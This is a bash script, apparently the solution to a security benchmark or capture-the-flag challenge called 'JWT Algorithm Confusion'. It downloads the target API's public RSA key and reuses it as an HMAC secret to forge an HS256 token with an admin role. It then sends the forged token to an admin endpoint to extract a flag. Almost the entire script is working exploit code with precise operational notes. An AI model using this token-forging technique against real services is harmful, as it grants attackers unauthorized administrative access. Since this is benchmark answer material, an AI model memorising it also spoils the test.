#!/usr/bin/env bash
# APEX-003-25 — "JWT Algorithm Confusion" (tags: jwt, cryptographic)
#
# The API signs with RS256 and publishes its public key, which is ordinary. What
# is not ordinary is the verification: `algorithms: ['RS256', 'HS256']`. With
# HS256 in that list the key argument stops being a public key and becomes an
# HMAC secret, and the public key is a value anybody can fetch. So a token the
# server will accept costs one GET and one HMAC.
#
# Two h5i notes. The PEM has to be the file's exact bytes — the server HMACs
# what `readFileSync` returned, trailing newline included — so it comes out of
# the store with `show --body-to` rather than off a terminal. And the forged
# token then rides on `header.Authorization`, which is a header the session
# never sent, hence `--create`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex003-$$"
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

"$H5I" browser open "$URL/.well-known/public-key.pem" \
    --session "$SESSION" --new --capture >/dev/null
"$H5I" websec show res_0 --session "$SESSION" --body-to "$WORK/public.pem" >/dev/null

# `iss` and `aud` are checked; the algorithm is not.
TOKEN="$(python3 - "$WORK/public.pem" <<'PY'
import base64, hashlib, hmac, json, sys

key = open(sys.argv[1], "rb").read()
b64 = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
part = lambda obj: b64(json.dumps(obj, separators=(",", ":")).encode())

signed = part({"alg": "HS256", "typ": "JWT"}) + "." + part({
    "sub": "admin-001",
    "username": "admin",
    "role": "admin",
    "iss": "apex-secure-api",
    "aud": "apex-api-users",
})
print(signed + "." + b64(hmac.new(key, signed.encode(), hashlib.sha256).digest()))
PY
)"

send "$SESSION" req_0 --create \
    --set path=/api/admin/flag \
    --set "header.Authorization=Bearer $TOKEN" |
    flag
